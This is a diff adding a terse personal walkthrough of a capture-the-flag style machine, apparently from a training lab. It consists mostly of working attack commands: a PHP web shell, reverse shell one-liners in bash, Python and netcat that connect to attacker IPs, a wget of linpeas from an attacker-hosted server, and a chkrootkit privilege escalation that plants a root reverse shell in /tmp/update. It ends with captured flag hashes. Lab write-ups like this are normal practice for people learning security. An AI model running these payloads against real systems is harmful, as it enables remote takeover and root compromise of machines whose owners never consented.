@@ -1,0 +1,57 @@
+
+
+
+Used this command it the table value so it would allow us to pass command line arguments
+<?php system($_REQUEST["cmd"]) ?>
+
+
+
+
+
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
+
+python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+
+Now that we have a shell, lets run linpeas to look for privelege esc vectors. To get linpeas on the target machine, we will need to install linpeas on our machine, host a python server, then wget linpeas in the reverse shell 
+
+https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh
+
+MY MACHINE (in the linpeas folder that contains the script I want)
+python3 -m http.server 80  
+
+TARGET MACHINE
+wget http://10.10.14.6:80/linpeas.sh
+
+
+I ran linpeas and tried a couple of things based on what it found and I got stuck. Turned online for some help to find that there is a 'report' folder and that it has what looks to be a cronjob writing here every minute...I did not see anything like this in the linpeas script so I guess I just need to also look for things that do not appear to be normal. 
+
+Since the file is being written to about every minute, this gives us a clue that a cron job is being run every minute and in the job it writes to this directory.  To look for cron jobs, there is an autmated tool for us called pspy.
+
+
+I run that and start analyzing the output. I did not know this before, but /bin/sh /usr/bin/chkrootkit 
+has a vulnerability. Basically we create a file called 'update' in the tmp folder, and it will run as root....based on this will create the update file to create a reverse shell as a root user. 
+https://www.exploit-db.com/exploits/33899
+
+
+
+https://patchthenet.com/articles/linux-privilege-escalation-three-easy-ways-to-get-a-root-shell/
+
+
+
+
+MY UPDATE FILE 
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 5555 >/tmp/f
+
+
+
+
+
+
+User:
+b61fc690d9bfd782d82b40bcdb54c3eb
+
+root:
+d7097b111355621779a71c8ac694fa73
